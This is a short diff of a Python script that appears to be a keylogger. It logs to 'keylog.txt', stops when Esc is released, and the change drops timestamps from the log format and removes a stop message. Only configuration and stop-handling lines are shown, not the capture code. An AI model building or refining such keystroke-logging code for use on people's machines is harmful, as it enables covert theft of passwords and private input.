@@ -8,7 +8,7 @@ log_dir = "/"
 logging.basicConfig(
     filename=("keylog.txt"),
     level=logging.INFO,
-    format='%(asctime)s: %(message)s'
+    format='%(message)s'
 )
 
 
@@ -27,7 +27,6 @@ def start_keylogger():
 
 def on_key_release(key):
     if key == Key.esc:
-        print("stoppin logger")
         return False
 
 
